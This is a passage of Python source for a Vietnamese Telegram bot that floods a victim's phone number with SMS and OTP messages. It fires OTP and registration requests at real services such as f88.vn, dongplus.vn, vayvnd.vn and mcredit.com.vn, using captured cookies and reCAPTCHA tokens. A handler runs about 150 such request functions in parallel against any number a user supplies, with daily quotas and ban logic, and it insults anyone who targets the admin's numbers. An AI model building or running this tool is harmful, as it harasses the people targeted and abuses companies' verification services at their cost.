j8LBqpfDUMMsQAzooVYoMzsL3ezftB04lVqYIphoNyXWJxTY6lCDAr2nTyJycHcXCaBLyA7u9tfAsG0l59KJOc3fw2FYovsVYGjtPRme7L3HimSx-nADhStCZs2yJL9U4O9VBhyofjjICM-vNMzEsgSMtdh226vqDe-zw2vwI1liE1pH-tWeMXUi7nTB8Vt8VXBVJdh1WhusXQldqbFpcaxGAM3uVJZpHnrCX0SSkSJZQibxC-t9XZOqH284qSi8-RMp6nT8mVOp-ZN6BfuBbqLyLzgYuGe8M0UNjT6A-tipz9-BXieKJGawaAsuFMdWW7Gfz173-nxi7L_RYdLK2tXy1cNU1rZpxnOStIE1MrIvfRM1Dq0hi-BvLTSx5_X_Q96ONWH-YuNM-hIn5A5CS2Q6DZRjqUBi1GiRcLSDNaJSB6cE1ah3IzX496CyINf1SBD08TdhrELi0--5CgmHVs6jWOFqFoZCIHZH6bhILHaciCjG5GdOeViE3D3maP4m0ovC6b3sHMVHkGIedzMB7kE63lNp6IyG0DyYTxIjgMlZSJ2oLx9G2nMcd5MFfra_qHkFSy9hk397EdEVc2CDq7NlTuLNbZlat6iKgFMepFz-XrFRe4Y9dvcWPXyrTiKzQuNB3SxgNFLMv7v3YYPRFU6TRJWqyUWnReM_BDa4KXbg2GWyzvZ8d2e6p-R_3NC53j5G0sq46FZV3HNLhpi6vNBQslwOPVBMM0UQxxx_PikCtBnQ4MwrT2Q2u-cqWw_5MRF7FcLoW9aWrdcmGR2moa8I9RbNXrb99EwgcEBMSO2WojN4qILTX96UDOhnOpAseZzE-OuYBxzT1Mxk8oownU2yjnKVxuIl17E3HE5trpe86Jd6Fl89Vy981GIv_-8W6HDxY-G1tDTmjE\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="state"\r\n\r\n\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="backUrl"\r\n\r\nhttps://sso.tuoitre.vn/register-success\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="userAgent"\r\n\r\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="deviceType"\r\n\r\ndesktop\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D--\r\n'

    response = requests.post('https://sso.tuoitre.vn/register-v2', cookies=cookies, headers=headers, data=data)
    
    
def vdh17():
    headers = {
        'authority': 'api.f88.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-encoding': 'gzip',
        'content-type': 'application/json',
        'origin': 'https://online.f88.vn',
        'referer': 'https://online.f88.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': phone,
        'recaptchaResponse': '03AFcWeA5Xk5uQwzytNmeRAdXNqo6C8-taRHAeM-C8okqwp7iMg-hC6ZlFc7o3at8-c4X931eIy09BzhG627WJ92yifmtuAxDkvwKgeR87ZfTOE_4K7yFpb7B1xFMPmuzAgtJYR-SkNTYiEbvsFEN5PUhAa-wlZk790si3lwlDX0b4A0sdg4dqn-ZwDvIokJ37ixzgIRSTRns8t88DWt2l8umEH82Rzxjixt23ItbLUYQIa1GH3qqOEkhJTxa44kp-9ZJOjf0pM_aL621tZqBOmIgsHqmcV7w6rJCcdyCkcBEUeAMV3peuT36xwBv38ecey7_65Vz4XY8uE1-h_GMXFjs8Y7s-y4aquUzq2ST2F-QlpUKpIf02q7jMpzxnBv7oJL34troOAeB60IE7UBGRJXZJhfxuYr_Ov4R4AQX0FSKS0geqo2pmRMvFF3yyfesZywElSG4P3j1po1rO6GwhhaJVSbh8VJJBOIUgmWL-V5diabn-rrLHDHmHRoDNky3l_nw612rMcj2JU7wVou7sCFvHFX13rZrHHEsoUZqa75BPH7YFtMTgyJB8c_WPWtkyp-YqEMJyfN9f8J9F8RU-RZqqvOAsTggGug',
        'source': 'Online',
    }

    response = requests.post('https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP', headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh17: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh17: THẤT BẠI!"))   
        
        
def vdh18(phone):
    cookies = {
        '_gid': 'GA1.2.1794681595.1696862619',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1696862619.1.1.1696862632.47.0.0',
        '_ga': 'GA1.1.1910799487.1696862619',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1794681595.1696862619; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1696862619.1.1.1696862632.47.0.0; _ga=GA1.1.1910799487.1696862619',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if response.status_code == 200:
        print(format_print("*", "vdh18: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh18: THẤT BẠI!"))   
        
        
def vdh19(phone):
    cookies = {
        '_gid': 'GA1.2.1794681595.1696862619',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1696862619.1.1.1696862632.47.0.0',
        '_ga': 'GA1.1.1910799487.1696862619',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1794681595.1696862619; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1696862619.1.1.1696862632.47.0.0; _ga=GA1.1.1910799487.1696862619',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if response.status_code == 200:
        print(format_print("*", "vdh19: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh19: THẤT BẠI!"))   
        
        
def vdh20(phone):
    cookies = {
        '_gcl_au': '1.1.1809435067.1696739941',
        '_tt_enable_cookie': '1',
        '_ttp': 'CIUoyacsdO8Ydz1SJu7glLAeUWO',
        '_fbp': 'fb.1.1696739941662.159133482',
        '_ym_uid': '1696739942336717250',
        '_ym_d': '1696739942',
        '_ga_P2783EHVX2': 'GS1.1.1696862851.2.0.1696862851.60.0.0',
        '_ga': 'GA1.2.793830112.1696739941',
        '_gid': 'GA1.2.592580676.1696862851',
        '_gat_UA-151110385-1': '1',
        '_ym_isad': '2',
        '_ym_visorc': 'b',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.1809435067.1696739941; _tt_enable_cookie=1; _ttp=CIUoyacsdO8Ydz1SJu7glLAeUWO; _fbp=fb.1.1696739941662.159133482; _ym_uid=1696739942336717250; _ym_d=1696739942; _ga_P2783EHVX2=GS1.1.1696862851.2.0.1696862851.60.0.0; _ga=GA1.2.793830112.1696739941; _gid=GA1.2.592580676.1696862851; _gat_UA-151110385-1=1; _ym_isad=2; _ym_visorc=b',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'utm': [],
        'sourceSite': 3,
        'regScreenResolution': {
            'width': 1920,
            'height': 1080,
        },
    }

    response = requests.post('https://api.vayvnd.vn/v2/users', cookies=cookies, headers=headers, json=json_data) 
    if response.status_code == 200:
        print(format_print("*", "vdh20: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh20: THẤT BẠI!"))   
        
        
def vdh21(phone):
    cookies = {
        '_gcl_au': '1.1.1809435067.1696739941',
        '_tt_enable_cookie': '1',
        '_ttp': 'CIUoyacsdO8Ydz1SJu7glLAeUWO',
        '_fbp': 'fb.1.1696739941662.159133482',
        '_ym_uid': '1696739942336717250',
        '_ym_d': '1696739942',
        '_ga_P2783EHVX2': 'GS1.1.1696862851.2.0.1696862851.60.0.0',
        '_ga': 'GA1.2.793830112.1696739941',
        '_gid': 'GA1.2.592580676.1696862851',
        '_gat_UA-151110385-1': '1',
        '_ym_isad': '2',
        '_ym_visorc': 'b',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.1809435067.1696739941; _tt_enable_cookie=1; _ttp=CIUoyacsdO8Ydz1SJu7glLAeUWO; _fbp=fb.1.1696739941662.159133482; _ym_uid=1696739942336717250; _ym_d=1696739942; _ga_P2783EHVX2=GS1.1.1696862851.2.0.1696862851.60.0.0; _ga=GA1.2.793830112.1696739941; _gid=GA1.2.592580676.1696862851; _gat_UA-151110385-1=1; _ym_isad=2; _ym_visorc=b',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'utm': [],
        'sourceSite': 3,
        'regScreenResolution': {
            'width': 1920,
            'height': 1080,
        },
    }

    response = requests.post('https://api.vayvnd.vn/v2/users', cookies=cookies, headers=headers, json=json_data) 
    if response.status_code == 200:
        print(format_print("*", "vdh21: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh21: THẤT BẠI!"))   
        

def vdh22(phone):
    cookies = {
        '_gcl_au': '1.1.1605201530.1697100677',
        '_tt_enable_cookie': '1',
        '_ttp': 'sd_ABtboFuIna5H0eEEwJakaz4N',
        '_fbp': 'fb.2.1697100678672.2140738242',
        'afUserId': '323e4985-dd69-4b93-8739-3e1d62e020d3-p',
        '.AspNetCore.Antiforgery.iDxHxxTbyew': 'CfDJ8DVMx7rRkFpJpsz5RKDfFWoDvMJjouUCOw55_1Et0qLp2Gn54vZKUGmTMmv5JDFhSF857-AtXr2-FxzWq7LgVTLrBPrDKrOX3nsz7hVWNKJK2T_5EY4R9Q58nHGmfiHtAtHlI1DAlgD_U2pyZ91ArsU',
        'MC.WEB.PORTAL': 'CfDJ8DVMx7rRkFpJpsz5RKDfFWp8CGaZiWDRolUZWPBTM8i24eYj8dOcU1WWFycLSUhYyPVuK38IfoErf%2FBukD53FosOOcvv1TJfj8bGqBi6Dl%2BcKr%2FWdjYvyrSA9udcQYJG6SCR4dJwzL0cm7WWBnFCvuqyjitysVDswrbhaXCkLMgK',
        '_ga_TTZGWP0RXB': 'GS1.1.1700216508.2.0.1700216508.0.0.0',
        '_ga_XS831VGKPD': 'GS1.1.1700216508.2.0.1700216508.60.0.0',
        '_ga': 'GA1.3.2136226874.1697100678',
        '_gid': 'GA1.3.439833227.1700216509',
        '_gat_UA-215142412-1': '1',
        '__zi': '3000.SSZzejyD5TqvZ_IesKOIso2FuQcMH4R5Re7vwifMJDfym-lysHqJd7x8hxVQ71kOUeUlijTL6vnxWwYoDp4q.1',
        'AF_SYNC': '1700216511462',
    }

    headers = {
        'authority': 'mcredit.com.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.1605201530.1697100677; _tt_enable_cookie=1; _ttp=sd_ABtboFuIna5H0eEEwJakaz4N; _fbp=fb.2.1697100678672.2140738242; afUserId=323e4985-dd69-4b93-8739-3e1d62e020d3-p; .AspNetCore.Antiforgery.iDxHxxTbyew=CfDJ8DVMx7rRkFpJpsz5RKDfFWoDvMJjouUCOw55_1Et0qLp2Gn54vZKUGmTMmv5JDFhSF857-AtXr2-FxzWq7LgVTLrBPrDKrOX3nsz7hVWNKJK2T_5EY4R9Q58nHGmfiHtAtHlI1DAlgD_U2pyZ91ArsU; MC.WEB.PORTAL=CfDJ8DVMx7rRkFpJpsz5RKDfFWp8CGaZiWDRolUZWPBTM8i24eYj8dOcU1WWFycLSUhYyPVuK38IfoErf%2FBukD53FosOOcvv1TJfj8bGqBi6Dl%2BcKr%2FWdjYvyrSA9udcQYJG6SCR4dJwzL0cm7WWBnFCvuqyjitysVDswrbhaXCkLMgK; _ga_TTZGWP0RXB=GS1.1.1700216508.2.0.1700216508.0.0.0; _ga_XS831VGKPD=GS1.1.1700216508.2.0.1700216508.60.0.0; _ga=GA1.3.2136226874.1697100678; _gid=GA1.3.439833227.1700216509; _gat_UA-215142412-1=1; __zi=3000.SSZzejyD5TqvZ_IesKOIso2FuQcMH4R5Re7vwifMJDfym-lysHqJd7x8hxVQ71kOUeUlijTL6vnxWwYoDp4q.1; AF_SYNC=1700216511462',
        'origin': 'https://mcredit.com.vn',
        'referer': 'https://mcredit.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'phone': phone,
        'recaptchaToken': '03AFcWeA5ky51Fe1re7DMT-UdDOr4WIuLLvV27EyPmEHyMUV1Z4EFN_yEg4su8tb6mCBNbrWYQJkxxYgyY_SPG8w4JbIfmybpAPak3B6oEjSCkWst__3FGMv1CQeXPmurLhLUgr_sX5V-MBtm3fitXpU7_8nHgvfcfJF-K9hQjSa02kBHpDGV47s3kIogDZJUJygETypomIlgjmpKuotXNElHM5PPFMvPq9dGeuiRu7qTG32FTQraYHHFHU33G7uLnGgVV-8Iml9vj-HDXflnLUyzWUOAF6SePRMfUW_YZONhfnIb1Qvm9ZUb6q7jknYkpCXamie8ueDI9kB4bqcGFHkbiysn8QbPsuWRg2uWZJthLhBfMRnP3A_2FNOxkn3vzta-t5MYr1HKiiPsXE4thNhgkzqa_kWS96wv-i07WhN_8nMusrQJxJOhxth8SMWpG_1zwJ3u-mPOtZ-3asbPGV6H-CzbN8qalkNkhoddS4qPQJ9n_jUvV6T5SuNIynjyBzR5ljd2C3oidsu9kymoDCD3LujbWCcCo86Acv__GmbE9bOAC4oyxq_wkDBZkBzjxOwJm5jfM02OnKMdVOpwu2sE8QrDq42B8aiiFzRzSQimTW7A2JfZE09RvV5gYNIlrPr9cGyvg5fNdfZLKHwZgqnho_MRWd7LkQqDyS5DPjF0zqB-bP8FNzIlDh5MAp5PFPRQD72GdCjQD7t7GcIaHDL3KcZ7B_9Ixd34H7Pap1kKBeQ2_Q3BKJ4bA4h37DZppMT99R4q2m2o_Ur14HawF56JniiJZj2cgDdLMqBH1nhabfmw--OYkaNAbD0QRohtEkRB4cSua8QAE6NQ9JGdiBPEW90I-mPNSrcSMPc86OTpuDj_XQnVFFzvUx_B0kyVGOOlLrFNyuUnfTqAfYJg1vdQswN6Pj_ozS2oWVcqs2Yr7jh4caABn2xirKMErkIZGrQEpfosFl3TORx0FJVqZGmdibARoodx4dTyV2sJes4TQ5Xq0Ea7s2-4LDHOJXZCJd_EomAmrD8h3DfNB8WwIZzIkjkRdAGLaOS_KUqPxnrgoG_HJNH0F99Bihjz3beXKhuBKxGsMjmDdjn25EJtUDbu3lVj1-1_ZOQYR0HpJpP0Pjy4loA4xryrq0nYnCRbveASTX6AuV11ai1ATJqTtZbr0Tsw4Z6QISMkHkWjejPtf28Wpc6ibacqYfy-B-4j90EQGAKtB9c4g_bwqLKHgnCiD8o7ZPQQCEUthuEIQFvvRP5G-ymFGyP3J5BjbTDfsL0dbogYVyYMbrWa8CgVA9XE1VkJvH4DhRb4a9np3N-C5iN1k-pKI2s6xIMyFHU9fvYj_7xB-3mu1Rug694zj8LDh0HOqu09MjcoS4ThoCMAYL-vT21sekDFeg_6uYiYtGTJAgGYeLDQy7tlvAW0PpIlXvA9kwpBxa3LZ7rPqU17dZMx6Sv88fYNDUM88bmnfKM1OHeg5uLkHH_IeLsn_HFSHIfOtGa4y8_HMU-RcqwGj_41e_1-Kku7pyHgQYAgcylP_V9r9CeKNxcbL87Midq0fKti2wRjm1sBw6L6nMuiJJ7ZbvY_EdKyof-mRnYsQIDpw3BSYYnuMOwVCC12iIGwCI113j_fCQQPba2-crKEJg2YGvU9cI8PXdDtlHbn0k-UGPh98zLMJ',
    }

    response = requests.post('https://mcredit.com.vn/api/Customers/requestOTP', cookies=cookies, headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh22: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh22: THẤT BẠI!"))   
        

def vdh24(phone):
    cookies = {
        '_gcl_au': '1.1.1809435067.1696739941',
        '_tt_enable_cookie': '1',
        '_ttp': 'CIUoyacsdO8Ydz1SJu7glLAeUWO',
        '_fbp': 'fb.1.1696739941662.159133482',
        '_ym_uid': '1696739942336717250',
        '_ym_d': '1696739942',
        '_ga_P2783EHVX2': 'GS1.1.1700217286.3.0.1700217286.60.0.0',
        '_ga': 'GA1.2.793830112.1696739941',
        '_gid': 'GA1.2.1845910826.1700217287',
        '_gat_UA-151110385-1': '1',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.1809435067.1696739941; _tt_enable_cookie=1; _ttp=CIUoyacsdO8Ydz1SJu7glLAeUWO; _fbp=fb.1.1696739941662.159133482; _ym_uid=1696739942336717250; _ym_d=1696739942; _ga_P2783EHVX2=GS1.1.1700217286.3.0.1700217286.60.0.0; _ga=GA1.2.793830112.1696739941; _gid=GA1.2.1845910826.1700217287; _gat_UA-151110385-1=1; _ym_isad=2; _ym_visorc=w',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'utm': [],
        'sourceSite': 3,
        'regScreenResolution': {
            'width': 1920,
            'height': 1080,
        },
        'trackingId': 'UGFh74c7N52ZYXhkpolKiqp4aAKd8dIQewDvW3jyAKvcFHSlOPjHnqejm6gIh2KO',
    }

    response = requests.post('https://api.vayvnd.vn/v2/users', cookies=cookies, headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh24: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh24: THẤT BẠI!"))   
        
        
############################    [ MAIN ]    #############################



# [ MAIN ]
# Hàm thực hiện spam sms [ SPAM SMS ] 
def spamsms(message):
    global user_infor, spam_status, phone 
    User_id = str(message.chat.id)
    user_name = message.from_user.username
    if not user_name :
        full_name = message.from_user.first_name + " " + message.from_user.last_name
    else:    
        full_name = user_name
    time = thoigian + "  " + ngay
    # Phần lấy thông tin sdt 
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❌ Yêu cầu không đúng định dạng. Vui lòng nhập theo mẫu: /spam [dấu cách] số điện thoại muốn spam")
        return
    phone = parts[1]
    if phone in list_sdt_cam:
        bot.send_message(message.chat.id, "🚫 Số này nằm trong danh sách cấm ! Vui lòng nhập số khác")
        return 
    if phone in list_sdt_admin:
        bot.send_message(message.chat.id, "🖕😏🖕 Bố mày là admin ! Mày thích spam không con chó 🐶")  
        set_user_spam_admin.append({'user_id': User_id, 'time': datetime.now(), 'user': full_name})
        return 
    if len(phone) != 10:
        bot.send_message(message.chat.id, "⚠️ Số điện thoại phải đủ 10 số ! Vui lòng nhập lại")
        return 
    # Kiểm tra tính hợp lệ cuả sdt    
    if test_dsphone(message, phone)  == "Không Hợp Lệ":
        return 
    sdt = phone 
    so_lan_spam = 1 
    # Hệ thống antispam     
    if phone in spam_status and spam_status[phone]['status'] == 'spamming':
        spam_warning_point[User_id]['point_spam'] += 1
        spam_warning_point_user = spam_warning_point[User_id]['point_spam']
        if spam_warning_point_user < 3:
            bot.send_message(message.chat.id, f"<b>Cảnh báo spam {spam_warning_point_user}/3\n\n⚠️ Số của bạn đang trong quá trình spam. Vui lòng chờ !</b>", parse_mode='HTML')
        elif spam_warning_point_user == 3:
            keyboard = InlineKeyboardMarkup()
            button_admin_hotro = InlineKeyboardButton(text="🧑‍🔧 Admin hỗ trợ", url="https://t.me/TruongChinh304")
            keyboard.row(button_admin_hotro)
            set_user_ban.append(User_id)
            bot.send_message(message.chat.id, "🔐 <b>Đạt giới hạn 3/3. Bạn đã bị hệ thống ban\n\n➤ Liên hệ admin để được hỗ trợ !</b>", parse_mode = 'HTML', reply_markup=keyboard)
            # Dừng quá trình spam của user bị ban
            spam_status[phone]['status'] = 'banned'
        return
    try:
        # Cập nhật trạng thái spam của số điện thoại
        spam_status[phone] = {'status': 'spamming', 'user_id': User_id}
        
        user_infor[User_id]['tong_lan_spam_trong_ngay'] += 1 
        tong_lan_spam_trong_ngay = user_infor[User_id]['tong_lan_spam_trong_ngay'] 
        user_infor[User_id]['tong_lan_spam_con_lai_trong_ngay'] -= 1 
        tong_lan_spam_con_lai_trong_ngay = user_infor[User_id]['tong_lan_spam_con_lai_trong_ngay'] 
        # Bot gửi tin nhắn thông báo spam 
        bot.send_message(message.chat.id,  f"┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                                           f"┣➤🚀Yêu cầu spam thành công 🚀\n"
                                           f"┣➤🚀Tiến trình <b>({tong_lan_spam_trong_ngay}/15)</b> Còn lại <b>{tong_lan_spam_con_lai_trong_ngay}</b>\n"
                                           f"┣➤👤User: <i>@{full_name}</i>\n"
                                           f"┣➤💳ID User: <b>[{User_id}]</b>\n"
                                           f"┣➤📱SĐT spam: <b>[{phone}]</b>\n"
                                           f"┣➤⏱️Thời gian chờ: <b>[20s]</b>\n"
                                           f"┣➤⏱️Thời gian: <b>{time}</b>\n"
                                           f"┗━━━━━━━━━━━━━━━━━━━━━━━┛\n",
                                           parse_mode='HTML'
        )
        user_lsspam[User_id].append({
            'thoi_gian_spam' : time,
            'so_lan_spam': so_lan_spam,
            'so_dien_thoai': phone 
        })    
        print(f"{Fore.RED}{'BẮT ĐẦU SPAM ' + phone + ' - ID : ' + User_id + ' - ' + str(so_lan_spam)}{Style.RESET_ALL}".center(65))
        print("\n")
        def execute_tasks(phone):
            try:
                with ThreadPoolExecutor(max_workers=100) as executor:
                    tasks = [
                        oldvayvnd, oldpops, oldtv360, oldloship, oldalfrescos, oldfptshop, 
                        oldfacebook, oldzalopay, vieon, ahamove, concung, fptplay, 
                        funring, gotadi, winmart, daihocfpt, cafeland, atmonline, 
                        popeyes, alfrescos, tv360, oldloship, fpt, vayvnd, meta, 
                        vieon, winmart, concung, funring, fptplay, viettel, tgdd, 
                        dkvt, kiot, bibabo, pizzahut, gapo, nhathuocankhang, 
                        nhathuoclongchau, riviu, phuclong, ICANKID, medigoapp, 
                        ecogreen, pharmacity, ghn, beecow, thepizzacompany,
                        sms0, sms1, sms2, sms3, sms4, sms5, sms7, sms8, sms9, 
                        sms10, sms11, sms12, sms13, sms14, sms15, sms17, sms18, 
                        sms19, sms20, sms21, sms22, sms23, sms24, sms25, sms26, 
                        sms27, sms28, sms29, sms30, sms31, sms32, sms33, sms34, 
                        sms35, sms36, sms37, sms38, sms39, sms40, sms41, sms42, 
                        sms43, sms44, call2, call6, call3, call4, call5, call7,
                        vdh1, vdh2, vdh3, vdh4, vdh5, vdh7, vdh6, vdh8, vdh9, vdh10,
                        vdh11, vdh12, vdh14, vdh13, vdh15, vdh16, vdh17, vdh18, vdh19, 
                        vdh20, vdh21, vdh22, vdh3, vdh24
                    ]
                    futures = [executor.submit(task, phone) for task in tasks]
                    done, not_done = wait(futures, timeout=20, return_when=ALL_COMPLETED)
                    if not_done:
                        for future in not_done:
                            future.cancel()
                        bot.send_message(message.chat.id, f"<b>Lần {tong_lan_spam_trong_ngay}/15\n📋 Hoàn tất spam [{phone}]</b>", parse_mode='HTML')
                        print("\n--------------------- ĐÃ SPAM XONG ---------------------\n")
                    else:
                        bot.send_message(message.chat.id, f"<b>Lần {tong_lan_spam_trong_ngay}/15\n📋 Hoàn tất spam [{phone}]</b>", parse_mode='HTML')
                        print("\n--------------------- ĐÃ SPAM XONG ---------------------\n")
                    spam_status[phone] = {'status': 'completed' if not not_done else 'timeout', 'user_id': User_id}
            except Exception as e:
                print(e) 
                spam_status[phone] = {'status': 'error', 'user_id': User_id}
        execute_tasks(phone)
    except Exception as e:
        print(e)  # In lỗi ra terminal
        spam_status[phone] = {'status': 'error', 'user_id': User_id}


# # Hàm kiểm tra tính hợp lệ cuả số điện thoại (đầu số)
def test_dsphone(message, phone):
    so_hop_le = ['03', '08', '09', '05', '07', '099', '092', '087']
    than_so_hop_le = "^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$"
    # Kiểm tra số điện thoại bằng biểu thức chính quy
    if re.search(than_so_hop_le, phone):
        return "Hợp Lệ"
    # Kiểm tra số điện thoại dựa trên danh sách đầu số hợp lệ
    if len(phone) == 10 and phone.isdigit():
        for dau_so_hop_le in so_hop_le:
            if phone.startswith(dau_so_hop_le):
                return "Hợp Lệ"
    bot.send_message(message.chat.id, "<b>🚫 Số điện thoại không hợp lệ !!!</b>", parse_mode='HTML')
    return "Không Hợp Lệ"        
    
    
# Hàm kiểm tra số lần còn lại để sử dụng bot trong ngày 
@bot.message_handler(commands=['spam'])    
def test(message):
    User_id = str(message.chat.id)
    if user_infor[User_id]['tong_lan_spam_trong_ngay'] == 15 and user_infor[User_id]['tong_lan_spam_con_lai_trong_ngay'] == 0:
        bot.send_message(message.chat.id, "Bạn đã dùng hết lượt Spam hôm nay !")
    elif user_infor[User_id]['tong_lan_spam_trong_ngay'] == 0 and user_infor[User_id]['tong_lan_spam_con_lai_trong_ngay'] == 0:
        nut_lay_key_spam = telebot.types.InlineKeyboardButton("Get key spam 🔑", callback_data="get_key_spam")
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.row(nut_lay_key_spam)
        bot.send_message(message.chat.id, f"👇 Nhấp vào đây để lấy key spam", parse_mode='Markdown', reply_markup=keyboard)
    elif User_id in set_user_ban:
        keyboard = InlineKeyboardMarkup()
        button_admin_hotro = InlineKeyboardButton(text="🧑‍🔧 Admin hỗ trợ", url="https://t.me/TruongChinh304")
        keyboard.row(button_admin_hotro)
